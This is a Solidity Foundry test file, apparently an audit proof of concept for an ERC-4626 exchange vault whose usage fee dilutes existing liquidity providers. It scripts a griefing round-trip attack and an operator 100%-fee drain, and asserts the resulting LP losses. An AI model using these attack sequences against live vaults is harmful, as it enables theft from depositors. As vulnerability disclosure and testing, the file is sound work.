// SPDX-License-Identifier: BSL-1.1
pragma solidity ^0.8.0;

import {console2} from "forge-std/console2.sol";
import {IERC20} from "@crane/contracts/interfaces/IERC20.sol";
import {IERC4626} from "@crane/contracts/interfaces/IERC4626.sol";
import {IStandardExchangeIn} from "@crane/contracts/interfaces/IStandardExchangeIn.sol";
import {IVaultFeeOracleManager} from "contracts/interfaces/IVaultFeeOracleManager.sol";
import {IVaultFeeOracleQuery} from "contracts/interfaces/IVaultFeeOracleQuery.sol";
import {TestBase_ERC4626StandardExchange} from "contracts/test/bases/TestBase_ERC4626StandardExchange.sol";
import {SimpleMintableERC20} from "contracts/test/stubs/SimpleMintableERC20.sol";
import {SimpleYieldERC4626} from "contracts/test/stubs/SimpleYieldERC4626.sol";

/// h2-admin-upgrade: dilutive usage fee (D40) is minted ON TOP of the depositor's shares, so the
/// fee is borne by existing holders. (A) unprivileged round trips grief LPs at ~S/s amplification;
/// (B) operator-settable fee (<=100%, no timelock) + feeTo self-cycling drains LPs.
contract UsageFeeDilution_Test is TestBase_ERC4626StandardExchange {
    SimpleMintableERC20 internal underlying;
    SimpleYieldERC4626 internal pv;
    address internal lp = makeAddr("lp");
    address internal griefer = makeAddr("griefer");
    address internal se;

    function setUp() public override {
        TestBase_ERC4626StandardExchange.setUp();
        underlying = new SimpleMintableERC20("Underlying", "UND");
        pv = new SimpleYieldERC4626(underlying);
        _fund(lp, 1_000 ether);
        _fund(griefer, 100 ether);
        // Honest config: live mainnet default usage fee is 5% (manager 0x0968..: defaultUsageFee()=5e16).
        vm.prank(owner);
        IVaultFeeOracleManager(address(indexedexManager)).setDefaultUsageFee(5e16);
        se = erc4626StandardExchangeDFPkg.deployVault(IERC4626(address(pv)));
        // Honest LP deposits 1000 receipts.
        vm.startPrank(lp);
        IERC20(address(pv)).approve(se, type(uint256).max);IStandardExchangeIn(se).exchangeIn(IERC20(address(pv)), 1_000 ether, IERC20(se), 0, lp, false, block.timestamp);
        vm.stopPrank();
    }

    function _fund(address who, uint256 amt) internal {
        underlying.mint(who, amt);
        vm.startPrank(who);
        underlying.approve(address(pv), type(uint256).max);
        pv.deposit(amt, who);
        vm.stopPrank();
    }

    function _valueOf(address who) internal view returns (uint256) {
        uint256 s = IERC20(se).balanceOf(who);
        if (s == 0) return 0;
        return (s * IERC20(address(pv)).balanceOf(se)) / IERC20(se).totalSupply();
    }

    function _cycle(address who, uint256 amt) internal {
        vm.startPrank(who);
        IERC20(address(pv)).approve(se, type(uint256).max);uint256 s = IStandardExchangeIn(se).exchangeIn(IERC20(address(pv)), amt, IERC20(se), 0, who, false, block.timestamp);IStandardExchangeIn(se).exchangeIn(IERC20(se), s, IERC20(address(pv)), 0, who, false, block.timestamp);
        vm.stopPrank();
    }

    /// (A) Unprivileged: griefer round-trips 10 receipts 20 times at the 5% default.
    function test_A_unprivileged_roundtrip_externalizes_fee_to_LPs() public {
        address feeTo = address(IVaultFeeOracleQuery(address(indexedexManager)).feeTo());
        uint256 lpBefore = _valueOf(lp);
        uint256 gBefore = IERC20(address(pv)).balanceOf(griefer);
        for (uint256 i; i < 20; ++i) _cycle(griefer, 10 ether);
        uint256 lpAfter = _valueOf(lp);
        uint256 gAfter = IERC20(address(pv)).balanceOf(griefer);
        uint256 gCost = gBefore - gAfter;
        uint256 lpLoss = lpBefore - lpAfter;
        console2.log("cycled volume", uint256(200 ether));
        console2.log("griefer cost", gCost);
        console2.log("LP loss", lpLoss);
        console2.log("feeTo value", _valueOf(feeTo));
        assertGt(lpLoss, 0, "LP lost value");
        assertGt(lpLoss, gCost * 50, "LP loss >> griefer cost (fee externalized)");
        // Expected if fee were charged to depositor: griefer cost ~= 5% of 200 = 10 ether, LP loss ~0.
    }

    /// (B) Privileged operator: per-vault fee 100% (validated <= 1e18, instant), feeTo cycles.
    function test_B_operator_fee100_feeTo_cycles_drains_LP() public {
        address feeTo = address(IVaultFeeOracleQuery(address(indexedexManager)).feeTo());
        _fund(feeTo, 1_000 ether);
        vm.prank(owner);
        IVaultFeeOracleManager(address(indexedexManager)).setUsageFeeOfVault(se, 1e18);
        uint256 lpBefore = _valueOf(lp);
        uint256 fBefore = IERC20(address(pv)).balanceOf(feeTo);
        uint256 feeToPreShares = _valueOf(feeTo); // legit 5% fee already earned on LP's deposit
        for (uint256 i; i < 5; ++i) {
            _cycle(feeTo, 1_000 ether);
            // feeTo also redeems the minted fee shares
            uint256 fs = IERC20(se).balanceOf(feeTo);
            vm.prank(feeTo);IStandardExchangeIn(se).exchangeIn(IERC20(se), fs, IERC20(address(pv)), 0, feeTo, false, block.timestamp);
        }
        uint256 fAfter = IERC20(address(pv)).balanceOf(feeTo);
        uint256 lpAfter = _valueOf(lp);
        console2.log("LP value before", lpBefore);
        console2.log("LP value after", lpAfter);
        console2.log("feeTo profit", fAfter - fBefore);
        console2.log("feeTo legit pre-existing fee value", feeToPreShares);
        console2.log("feeTo excess extraction", fAfter - fBefore - feeToPreShares);
        assertGt(fAfter, fBefore, "feeTo profit");
        assertApproxEqAbs(fAfter - fBefore - feeToPreShares, lpBefore - lpAfter, 1e6, "excess profit == LP loss");
        assertLt(lpAfter, lpBefore / 2, "LP lost >50%");
    }
}
